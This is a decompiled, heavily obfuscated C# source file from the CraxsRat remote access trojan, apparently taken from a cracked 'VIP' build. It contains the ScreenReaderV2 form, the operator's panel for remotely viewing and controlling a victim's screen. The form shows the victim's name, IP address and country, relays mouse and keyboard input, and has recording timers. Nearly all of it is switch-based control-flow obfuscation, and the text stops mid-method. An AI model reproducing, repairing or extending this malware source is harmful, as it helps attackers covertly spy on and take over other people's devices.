// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.ScreenReaderV2
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.My;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class ScreenReaderV2 : Form
  {
    public List<Client> listclients;
    public List<Client> SelectedList;
    public string type;
    public string Openthis;
    private IContainer components;

    internal virtual Panel Panel2
    {
      get => ((ScreenShoter) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenShoter) this)._Panel2 = value;
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
    {
      get => ((ScreenShoter) this)._DrakeUIButtonIcon2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon2_Click);
label_1:
        int num1 = 1632757667;
        DrakeUIButtonIcon drakeUiButtonIcon2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(~num1 + ((809445912 ^ 1448644176) - ~-143094835) * -893103447 * 2137993281)) % 9U)
          {
            case 0:
              ((ScreenShoter) this)._DrakeUIButtonIcon2 = value;
              num1 = -1975771764;
              continue;
            case 1:
              drakeUiButtonIcon2 = ((ScreenShoter) this)._DrakeUIButtonIcon2;
              num1 = (int) num2 * 2137627934 ^ 1717211554;
              continue;
            case 2:
              drakeUiButtonIcon2 = ((ScreenShoter) this)._DrakeUIButtonIcon2;
              num1 = (int) num2 * -950363230 ^ -997168833;
              continue;
            case 3:
              drakeUiButtonIcon2.Click -= eventHandler;
              num1 = (int) num2 * -583413671 ^ -404257805;
              continue;
            case 4:
              goto label_1;
            case 5:
              int num3 = drakeUiButtonIcon2 == null ? -1837826092 : (num3 = -1419474576);
              num1 = num3 ^ (int) num2 * 2088892308;
              continue;
            case 6:
              goto label_3;
            case 7:
              drakeUiButtonIcon2.Click += eventHandler;
              num1 = (int) num2 * 891968354 ^ -1454877722;
              continue;
            case 8:
              int num4 = drakeUiButtonIcon2 == null ? 1310165209 : (num4 = -2080366313);
              num1 = num4 ^ (int) num2 * 930770173;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUIButtonIcon disablebtn
    {
      get => ((ScreenShoter) this)._disablebtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Disablebtn_Click);
label_1:
        int num1 = 1133726966;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUIButtonIcon disablebtn;
          switch ((num3 = (uint) ((-1503220490 - (-(num2 * 847083817 * -411773059) ^ 2106594379 - 1881424768 ^ -502753370)) * -1526405809)) % 9U)
          {
            case 0:
              goto label_3;
            case 1:
              disablebtn.Click -= eventHandler;
              num1 = (int) num3 * -36663847 ^ 164166505;
              continue;
            case 2:
              int num4 = disablebtn == null ? 1249005564 : (num4 = -1351026652);
              num1 = num4 ^ (int) num3 * 1849370377;
              continue;
            case 3:
              disablebtn = ((ScreenShoter) this)._disablebtn;
              num1 = (int) num3 * -1016410203 ^ -829857309;
              continue;
            case 4:
              int num5 = disablebtn == null ? 284135434 : (num5 = -1518090518);
              num1 = num5 ^ (int) num3 * 128578096;
              continue;
            case 5:
              disablebtn.Click += eventHandler;
              num1 = (int) num3 * 991931790 ^ 1336946892;
              continue;
            case 6:
              goto label_1;
            case 7:
              ((ScreenShoter) this)._disablebtn = value;
              num1 = 777029348;
              continue;
            case 8:
              disablebtn = ((ScreenShoter) this)._disablebtn;
              num1 = (int) num3 * -1814578583 ^ 1526463457;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUIButtonIcon enablebtn
    {
      get => ((ScreenShoter) this)._enablebtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Enablebtn_Click);
label_1:
        int num1 = 1477828454;
        DrakeUIButtonIcon enablebtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-(~~num1 + (~-436087088 - (2069765229 - 1361494856) - 969347319)) ^ 985572211 ^ -1489505149) - 1768636222)) % 8U)
          {
            case 0:
              ((ScreenShoter) this)._enablebtn = value;
              num1 = 1638289301;
              continue;
            case 1:
              enablebtn = ((ScreenShoter) this)._enablebtn;
              num1 = (int) num2 * -1018375072 ^ 1494015803;
              continue;
            case 2:
              enablebtn = ((ScreenShoter) this)._enablebtn;
              int num3 = enablebtn == null ? 587030682 : (num3 = 873747256);
              num1 = num3 ^ (int) num2 * -985053683;
              continue;
            case 3:
              enablebtn.Click -= eventHandler;
              num1 = (int) num2 * -536063385 ^ -490048726;
              continue;
            case 4:
              int num4 = enablebtn == null ? 1239280735 : (num4 = -1172159956);
              num1 = num4 ^ (int) num2 * -1760427210;
              continue;
            case 5:
              enablebtn.Click += eventHandler;
              num1 = (int) num2 * 1626024130 ^ 539291378;
              continue;
            case 6:
              goto label_1;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel ctrlpanel
    {
      get => ((ScreenShoter) this)._ctrlpanel;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenShoter) this)._ctrlpanel = value;
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
    {
      get => ((ScreenShoter) this)._DrakeUIButtonIcon1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click);
        DrakeUIButtonIcon drakeUiButtonIcon1 = ((ScreenShoter) this)._DrakeUIButtonIcon1;
        if (drakeUiButtonIcon1 == null)
          goto label_5;
label_1:
        int num1 = 184209071;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(--(~num1 - ((~(-2018376764 - -468495889) ^ -143148071) + ~(-2072262405 * -1495535357))) - ~-507043366)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              drakeUiButtonIcon1 = ((ScreenShoter) this)._DrakeUIButtonIcon1;
              num1 = (int) num2 * -671280788 ^ 756702156;
              continue;
            case 2:
              goto label_5;
            case 3:
              int num3 = drakeUiButtonIcon1 == null ? -233036599 : (num3 = -1410159667);
              num1 = num3 ^ (int) num2 * 1576306822;
              continue;
            case 4:
              drakeUiButtonIcon1.Click += eventHandler;
              num1 = (int) num2 * 379944560 ^ -761400635;
              continue;
            case 5:
              goto label_3;
            case 6:
              drakeUiButtonIcon1.Click -= eventHandler;
              num1 = (int) num2 * 1838434666 ^ 405002015;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_5:
        ((ScreenShoter) this)._DrakeUIButtonIcon1 = value;
        num1 = 1162333332;
        goto label_2;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
    {
      get => ((ScreenShoter) this)._DrakeUIButtonIcon3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon3_Click);
        DrakeUIButtonIcon drakeUiButtonIcon3 = ((ScreenShoter) this)._DrakeUIButtonIcon3;
        if (drakeUiButtonIcon3 == null)
          goto label_5;
label_1:
        int num1 = -1706145550;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((~~num1 ^ -1252239039) - ~(-951942287 ^ 756526514) - ~-762196707)) % 6U)
          {
            case 0:
              drakeUiButtonIcon3 = ((ScreenShoter) this)._DrakeUIButtonIcon3;
              int num3 = drakeUiButtonIcon3 == null ? -1338453476 : (num3 = -1231745585);
              num1 = num3 ^ (int) num2 * -1448369329;
              continue;
            case 1:
              goto label_5;
            case 2:
              drakeUiButtonIcon3.Click -= eventHandler;
              num1 = (int) num2 * -211385066 ^ -285969889;
              continue;
            case 3:
              drakeUiButtonIcon3.Click += eventHandler;
              num1 = (int) num2 * -1857740351 ^ -1142661041;
              continue;
            case 4:
              goto label_3;
            case 5:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_5:
        ((ScreenShoter) this)._DrakeUIButtonIcon3 = value;
        num1 = 1827546634;
        goto label_2;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
    {
      get => ((ScreenShoter) this)._DrakeUIButtonIcon4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon4_Click);
label_1:
        int num1 = 1644017108;
        DrakeUIButtonIcon drakeUiButtonIcon4;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-(num1 - ~(-~(-1104661072 - -589496609) - ~(~197509937 - (1905723114 - -1078606352))) ^ ~(1532830741 - 455930202 ^ ~2044942695) + (-312325550 + (549860996 - -1494922950) ^ ~(-1945936890 ^ 760679025))) ^ --881050632 - (81949131 - 1381838490)) + ~-1695758650 - -783960741)) % 8U)
          {
            case 0:
              drakeUiButtonIcon4.Click -= eventHandler;
              num1 = (int) num2 * 1252071718 ^ -1552047447;
              continue;
            case 1:
              drakeUiButtonIcon4 = ((ScreenShoter) this)._DrakeUIButtonIcon4;
              int num3 = drakeUiButtonIcon4 == null ? 1603058674 : (num3 = 2063271952);
              num1 = num3 ^ (int) num2 * 1421463307;
              continue;
            case 2:
              drakeUiButtonIcon4 = ((ScreenShoter) this)._DrakeUIButtonIcon4;
              num1 = (int) num2 * -1174897565 ^ 1145758510;
              continue;
            case 3:
              goto label_3;
            case 4:
              goto label_1;
            case 5:
              int num4 = drakeUiButtonIcon4 == null ? 1081642493 : (num4 = -1299455159);
              num1 = num4 ^ (int) num2 * 1962215103;
              continue;
            case 6:
              ((ScreenShoter) this)._DrakeUIButtonIcon4 = value;
              num1 = -1654087243;
              continue;
            case 7:
              drakeUiButtonIcon4.Click += eventHandler;
              num1 = (int) num2 * 1670729384 ^ 93928110;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Timer presstimer
    {
      get => ((ScreenShoter) this)._presstimer;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Presstimer_Tick);
        Timer presstimer = ((ScreenShoter) this)._presstimer;
        if (presstimer == null)
          goto label_8;
label_1:
        int num1 = 165785382;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 - -(-(~-1996434787 + (118325209 ^ 1207773705)) - 378450587) + (-(--1396078695 - (1729507761 ^ -1839037835)) - ((1557585689 * -1540780962 ^ -1544633682 - 727205938) + --1928232474)) ^ ~-1861195985 ^ ~~799790203) + (16804259 + -1402771857 * -1202858344) - ~-2079559252)) % 7U)
          {
            case 0:
              presstimer.Tick += eventHandler;
              num1 = (int) num2 * -1344224527 ^ -1029501120;
              continue;
            case 1:
              goto label_3;
            case 2:
              presstimer.Tick -= eventHandler;
              num1 = (int) num2 * -227294728 ^ -1059427189;
              continue;
            case 3:
              int num3 = presstimer == null ? 1515760961 : (num3 = -1141589274);
              num1 = num3 ^ (int) num2 * 1085592518;
              continue;
            case 4:
              presstimer = ((ScreenShoter) this)._presstimer;
              num1 = (int) num2 * 1029737524 ^ 85342121;
              continue;
            case 5:
              goto label_1;
            case 6:
              goto label_8;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_8:
        ((ScreenShoter) this)._presstimer = value;
        num1 = -1102147510;
        goto label_2;
      }
    }

    internal virtual DrakeUIToolTip DrakeUIToolTip1
    {
      get => ((ScreenShoter) this)._DrakeUIToolTip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenShoter) this)._DrakeUIToolTip1 = value;
      }
    }

    internal virtual DrakeUICheckBox Save
    {
      get => ((ScreenShoter) this)._Save;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Save_MouseClick);
label_1:
        int num1 = 131019714;
        DrakeUICheckBox save;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~(num1 * 1544410821) - ~~(-153022761 * 1047859960)) * 18123409 - -743279892)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              save.MouseClick += mouseEventHandler;
              num1 = (int) num2 * 59147127 ^ 732616690;
              continue;
            case 3:
              ((ScreenShoter) this)._Save = value;
              save = ((ScreenShoter) this)._Save;
              int num3;
              num1 = num3 = save == null ? -1827274677 : (num3 = 340209852);
              continue;
            case 4:
              int num4 = save == null ? 371975176 : (num4 = -395479747);
              num1 = num4 ^ (int) num2 * 409446511;
              continue;
            case 5:
              save = ((ScreenShoter) this)._Save;
              num1 = (int) num2 * 1234954946 ^ -895607782;
              continue;
            case 6:
              save.MouseClick -= mouseEventHandler;
              num1 = (int) num2 * 1588240731 ^ -152848340;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Timer savetimer
    {
      get => ((ScreenShoter) this)._savetimer;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Savetimer_Tick);
label_1:
        int num1 = 1472274259;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Timer savetimer;
          switch ((num3 = (uint) ((-((-(945470781 * -470998374 - 675528782 * -1509065413) ^ ~-1295631947) - ((~((1082767172 ^ 1393784356) + (137379610 - 639659571)) ^ ~--563731883) + 119669043 * (-2088720137 * 865832461 ^ ~(-465716509 ^ 1362603046)) - num2)) - 43833309) * -1366871589 * -411190789)) % 9U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              savetimer = ((ScreenShoter) this)._savetimer;
              num1 = (int) num3 * -741856589 ^ 1974583768;
              continue;
            case 3:
              savetimer = ((ScreenShoter) this)._savetimer;
              num1 = (int) num3 * 1723481764 ^ -290300665;
              continue;
            case 4:
              int num4 = savetimer == null ? -1312929334 : (num4 = 2096610843);
              num1 = num4 ^ (int) num3 * 1105346969;
              continue;
            case 5:
              ((ScreenShoter) this)._savetimer = value;
              num1 = 1273291850;
              continue;
            case 6:
              savetimer.Tick -= eventHandler;
              num1 = (int) num3 * 1332734826 ^ -1951623101;
              continue;
            case 7:
              int num5 = savetimer == null ? -217561125 : (num5 = 861345655);
              num1 = num5 ^ (int) num3 * -934307300;
              continue;
            case 8:
              savetimer.Tick += eventHandler;
              num1 = (int) num3 * -646161902 ^ 186558225;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual Label activetext
    {
      get => ((ScreenShoter) this)._activetext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenShoter) this)._activetext = value;
    }

    internal virtual PictureBox viewpic
    {
      get => ((ScreenShoter) this)._viewpic;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler1 = new MouseEventHandler(this.PictureBox1_MouseDown);
        MouseEventHandler mouseEventHandler2 = new MouseEventHandler(this.Viewpic_MouseMove);
        MouseEventHandler mouseEventHandler3 = new MouseEventHandler(this.Viewpic_MouseUp);
label_1:
        int num1 = -1213764917;
        PictureBox viewpic;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(~(~~num1 * 96042151) * 801148689)) % 12U)
          {
            case 0:
              goto label_3;
            case 1:
              ((ScreenShoter) this)._viewpic = value;
              num1 = 2019797342;
              continue;
            case 2:
              viewpic.MouseDown += mouseEventHandler1;
              num1 = (int) num2 * 1018119238 ^ -79540360;
              continue;
            case 3:
              viewpic = ((ScreenShoter) this)._viewpic;
              int num3 = viewpic == null ? 2133325524 : (num3 = -1739463202);
              num1 = num3 ^ (int) num2 * -1103706209;
              continue;
            case 4:
              goto label_1;
            case 5:
              viewpic.MouseMove += mouseEventHandler2;
              num1 = (int) num2 * -43925429 ^ -196947899;
              continue;
            case 6:
              viewpic = ((ScreenShoter) this)._viewpic;
              num1 = (int) num2 * 2047637033 ^ 933072030;
              continue;
            case 7:
              viewpic.MouseUp += mouseEventHandler3;
              num1 = (int) num2 * -1451650662 ^ -1447596817;
              continue;
            case 8:
              viewpic.MouseDown -= mouseEventHandler1;
              num1 = (int) num2 * 572328138 ^ 1288152847;
              continue;
            case 9:
              int num4 = viewpic == null ? -1183145704 : (num4 = -263963563);
              num1 = num4 ^ (int) num2 * -184016876;
              continue;
            case 10:
              viewpic.MouseMove -= mouseEventHandler2;
              num1 = (int) num2 * 111945082 ^ -1367775766;
              continue;
            case 11:
              viewpic.MouseUp -= mouseEventHandler3;
              num1 = (int) num2 * 1869459683 ^ 108942421;
              continue;
            default:
              goto label_14;
          }
        }
label_3:
        return;
label_14:;
      }
    }

    internal virtual Timer Timer1
    {
      get => ((ScreenShoter) this)._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
label_1:
        int num1 = 365384290;
        Timer timer1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~num1 - (-(453704905 ^ 1800997639) - ~-764473211 - (--1233602409 - 1380830583 - -~-2097015715)) - -971945693 + (1479251002 * -1252356431 ^ -2012704050 ^ -651206816))) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              timer1 = ((ScreenShoter) this)._Timer1;
              int num3 = timer1 == null ? -137752124 : (num3 = -535924538);
              num1 = num3 ^ (int) num2 * -1200064968;
              continue;
            case 2:
              int num4 = timer1 == null ? 964165895 : (num4 = 93456114);
              num1 = num4 ^ (int) num2 * -1291807720;
              continue;
            case 3:
              goto label_1;
            case 4:
              timer1.Tick -= eventHandler;
              num1 = (int) num2 * 1192033716 ^ -1133498612;
              continue;
            case 5:
              ((ScreenShoter) this)._Timer1 = value;
              timer1 = ((ScreenShoter) this)._Timer1;
              num1 = 1341668332;
              continue;
            case 6:
              timer1.Tick += eventHandler;
              num1 = (int) num2 * -550396033 ^ -977823359;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Panel Panel3
    {
      get => ((ScreenShoter) this)._Panel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenShoter) this)._Panel3 = value;
    }

    internal virtual Label clinameinfo
    {
      get => ((ScreenShoter) this)._clinameinfo;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenShoter) this)._clinameinfo = value;
      }
    }

    internal virtual PictureBox ClientPic
    {
      get => ((ScreenShoter) this)._ClientPic;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenShoter) this)._ClientPic = value;
    }

    internal virtual Panel keyboardpanel
    {
      get => ((ScreenShoter) this)._keyboardpanel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenShoter) this)._keyboardpanel = value;
      }
    }

    internal virtual Panel buttompanel
    {
      get => ((ScreenShoter) this)._buttompanel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenShoter) this)._buttompanel = value;
      }
    }

    internal virtual DrakeUITextBox textsend
    {
      get => ((ScreenShoter) this)._textsend;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenShoter) this)._textsend = value;
    }

    internal virtual DrakeUIAvatar DrakeUIAvatar2
    {
      get => ((ScreenShoter) this)._DrakeUIAvatar2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIAvatar2_Click);
label_1:
        int num1 = -440266296;
        DrakeUIAvatar drakeUiAvatar2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -~((num1 - ---~(2116304151 ^ -570142207)) * -1668312711)) % 8U)
          {
            case 0:
              int num3 = drakeUiAvatar2 == null ? 595942809 : (num3 = 279608210);
              num1 = num3 ^ (int) num2 * -2003989783;
              continue;
            case 1:
              int num4 = drakeUiAvatar2 == null ? 1891405529 : (num4 = 297112224);
              num1 = num4 ^ (int) num2 * 2005133885;
              continue;
            case 2:
              drakeUiAvatar2 = ((ScreenShoter) this)._DrakeUIAvatar2;
              num1 = (int) num2 * -2055685053 ^ -1819401983;
              continue;
            case 3:
              goto label_3;
            case 4:
              drakeUiAvatar2.Click += eventHandler;
              num1 = (int) num2 * -1156069208 ^ -356977263;
              continue;
            case 5:
              goto label_1;
            case 6:
              ((ScreenShoter) this)._DrakeUIAvatar2 = value;
              drakeUiAvatar2 = ((ScreenShoter) this)._DrakeUIAvatar2;
              num1 = -1042010314;
              continue;
            case 7:
              drakeUiAvatar2.Click -= eventHandler;
              num1 = (int) num2 * 1889272968 ^ -642853788;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUIButtonIcon hidetoolbtn
    {
      get => ((ScreenShoter) this)._hidetoolbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Hidetoolbtn_Click);
label_1:
        int num1 = -1962124125;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUIButtonIcon hidetoolbtn;
          switch ((num3 = (uint) (-331840949 - ~(num2 ^ --((-1848822740 - 1796396675 ^ -1699667710 - 1264642887) + (--304608639 ^ ~1731441318))) * 1032980531)) % 9U)
          {
            case 0:
              hidetoolbtn = ((ScreenShoter) this)._hidetoolbtn;
              num1 = (int) num3 * 505202867 ^ -1967083315;
              continue;
            case 1:
              int num4 = hidetoolbtn == null ? 928657797 : (num4 = 1946652238);
              num1 = num4 ^ (int) num3 * -1291148248;
              continue;
            case 2:
              goto label_3;
            case 3:
              hidetoolbtn.Click += eventHandler;
              num1 = (int) num3 * -1115782365 ^ 1681438034;
              continue;
            case 4:
              hidetoolbtn = ((ScreenShoter) this)._hidetoolbtn;
              num1 = (int) num3 * 1150191860 ^ -1038921347;
              continue;
            case 5:
              int num5 = hidetoolbtn == null ? 1535309281 : (num5 = -663778927);
              num1 = num5 ^ (int) num3 * -1246304719;
              continue;
            case 6:
              goto label_1;
            case 7:
              hidetoolbtn.Click -= eventHandler;
              num1 = (int) num3 * -49896113 ^ 1918984421;
              continue;
            case 8:
              ((ScreenShoter) this)._hidetoolbtn = value;
              num1 = -484041314;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    public ScreenReaderV2()
    {
label_1:
      int num1 = -467851712;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (2037035244 - -(((num2 ^ --((-1493756173 ^ 1923016119 - 652387121) - 1968297542)) + ~(~(-520220601 * -1041516055) ^ -(840902800 - 2130514707))) * 1553636771 * 477791305))) % 11U)
        {
          case 0:
            ((SelfRemove) this).Rnew = 0;
            num1 = (int) num3 * 1728671192 ^ 1884324870;
            continue;
          case 1:
            this.Load += new EventHandler(this.ScreenReaderV2_Load);
            num1 = (int) num3 * -1941502165 ^ -2087244456;
            continue;
          case 2:
            ((Updater) this).tiks = 0;
            // ISSUE: reference to a compiler-generated method
            ((ScreenReader._Closure\u0024__52\u002D0) this).InitializeComponent();
            num1 = (int) num3 * -584774588 ^ -1062388570;
            continue;
          case 3:
            ((SelfRemove) this).ScreenShotFoucs = false;
            num1 = (int) num3 * 1410853375 ^ -1841176060;
            continue;
          case 4:
            this.FormClosing += new FormClosingEventHandler(this.ScreenReaderV2_FormClosing);
            num1 = (int) num3 * 256475926 ^ 243302059;
            continue;
          case 5:
            ((ScreenShoter) this).isclick = false;
            num1 = (int) num3 * -1679717673 ^ 1595747532;
            continue;
          case 6:
            ((Updater) this).Title = EXGuarder.\u0031A645877;
            num1 = (int) num3 * 1873951216 ^ 950788245;
            continue;
          case 7:
            ((ScreenShoter) this).Swaping = false;
            ((ScreenShoter) this).isdown = false;
            num1 = (int) num3 * 597260016 ^ -597705797;
            continue;
          case 8:
            goto label_1;
          case 9:
            goto label_3;
          case 10:
            ((SelfRemove) this).Recordit = false;
            num1 = (int) num3 * -1586977543 ^ -1878747226;
            continue;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:;
    }

    private void ScreenReaderV2_Load(object sender, EventArgs e)
    {
      try
      {
        // ISSUE: reference to a compiler-generated field
        this.ClientPic.Image = (Image) ((Data._Closure\u0024__39\u002D17) ((SelfRemove) this).classClient).Wallpaper;
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        this.clinameinfo.Text = EXGuarder.\u003416F2A5B + ((Data._Closure\u0024__39\u002D12) ((SelfRemove) this).classClient).ClientName + Strings.Space(2) + EXGuarder.\u00341177700 + ((Data) ((SelfRemove) this).classClient).ClientAddressIP + Strings.Space(2) + EXGuarder.\u0030D705657 + ((Data._Closure\u0024__39\u002D11) ((SelfRemove) this).classClient).Country;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_2:
        int num1 = -1206309924;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (1860576442 - -~((num2 - (~-1948328966 ^ -616138179 * (--1469798831 - (1635693717 - 237260922)) - -2132247543)) * -1798132411 ^ 294962074 ^ 1242609774 - 1690170491 + (-1595627241 ^ -1762238019)))) % 3U)
          {
            case 0:
              goto label_2;
            case 1:
              ProjectData.ClearProjectError();
              num1 = (int) num3 * -1276710116 ^ -1641203710;
              continue;
            default:
              goto label_6;
          }
        }
      }
label_6:
      ShowTipform showTipform = new ShowTipform(ZoomPictureBox.ShowScrenReadTip, Craxs_Rat.My.Resources.Resources.Tip_screenctrol);
      string tip = RegistryHandler.GET_Tip(ZoomPictureBox.ShowScrenReadTip);
label_7:
      int num4 = 2127064760;
      while (true)
      {
        int num5 = num4;
        uint num6;
        bool flag;
        switch ((num6 = (uint) (1860576442 - -~((num5 - (~-1948328966 ^ -616138179 * (--1469798831 - (1635693717 - 237260922)) - -2132247543)) * -1798132411 ^ 294962074 ^ 1242609774 - 1690170491 + (-1595627241 ^ -1762238019)))) % 9U)
        {
          case 0:
            goto label_9;
          case 1:
            num4 = (int) num6 * 1809671739 ^ -397281968;
            continue;
          case 2:
            flag = true;
            num4 = 1208696819;
            continue;
          case 3:
            flag = false;
            num4 = (int) num6 * -1547170329 ^ -2071263435;
            continue;
          case 4:
            flag = true;
            int num7 = tip == null ? 914337808 : (num7 = 493391635);
            num4 = num7 ^ (int) num6 * 1614539239;
            continue;
          case 5:
            int num8 = Operators.CompareString(tip, EXGuarder.\u00312083935, false) != 0 ? -6424902 : (num8 = 1635795793);
            num4 = num8 ^ (int) num6 * 2058973663;
            continue;
          case 6:
            int num9 = (int) showTipform.ShowDialog();
            num4 = (int) num6 * 1564595640 ^ -224872554;
            continue;
          case 7:
            goto label_7;
          case 8:
            int num10;
            num4 = num10 = !flag ? 477849166 : (num10 = -1761605347);
            continue;
          default:
            goto label_5;
        }
      }
label_9:
      return;
label_5:;
    }

    private void Savetimer_Tick(object sender, EventArgs e)
    {
    }

    private void Save_MouseClick(object sender, MouseEventArgs e)
    {
      if (!this.Save.Checked)
        goto label_5;
label_1:
      int num1 = 418089879;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~num1 * 666561341 + ~(-772901175 * -1472845059 + ~317824068) ^ -236391627 * ~99647017)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            this.Timer1.Start();
            num1 = (int) num2 * 1780518496 ^ 39566;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_5;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      return;
label_5:
      this.Timer1.Stop();
      num1 = -707807250;
      goto label_2;
    }

    private void Presstimer_Tick(object sender, EventArgs e)
    {
      // ISSUE: variable of a reference type
      int& local;
      // ISSUE: explicit reference operation
      int num = checked (^(local = ref ((Updater) this).tiks) + 1);
      local = num;
    }

    public string asab(string input)
    {
label_0:
      int num1 = -1089326939;
      string str1;
      while (true)
      {
        int num2 = num1;
        uint num3;
        bool flag;
        string[] strArray1;
        string str2;
        string[] strArray2;
        int index;
        string str3;
        switch ((num3 = (uint) -((~-2112358569 - (-1472741235 * (-109754859 - -(~-1612427474 - 1996839137 * 953558026)) - num2 - -(-1132448505 ^ -1560099969 ^ -1824270948)) - (1384974252 - 1289688197 + -1253530953 * 532944945)) * -1105235025)) % 14U)
        {
          case 1:
            int num4 = flag ? -1306395962 : (num4 = -530920734);
            num1 = num4 ^ (int) num3 * -2034393556;
            continue;
          case 2:
            num1 = (int) num3 * 917910893 ^ 841955189;
            continue;
          case 3:
            goto label_0;
          case 4:
            str3 = strArray2[index];
            num1 = -79175178;
            continue;
          case 5:
            flag = index < strArray2.Length;
            num1 = -1153709147;
            continue;
          case 6:
            int num5 = str3.Length <= 0 ? -1608807439 : (num5 = -1569311753);
            num1 = num5 ^ (int) num3 * 1836958661;
            continue;
          case 7:
            strArray1 = input.Replace(EXGuarder.\u00341706665, EXGuarder.\u0032B39245B).Split(' ');
            str2 = EXGuarder.\u003146F2F5A;
            num1 = (int) num3 * -569758559 ^ -1054569436;
            continue;
          case 8:
            str1 = str2;
            num1 = (int) num3 * 317122941 ^ 1510499464;
            continue;
          case 9:
            num1 = -1639513972;
            continue;
          case 10:
            num1 = (int) num3 * 995429959 ^ -1561327748;
            continue;
          case 11:
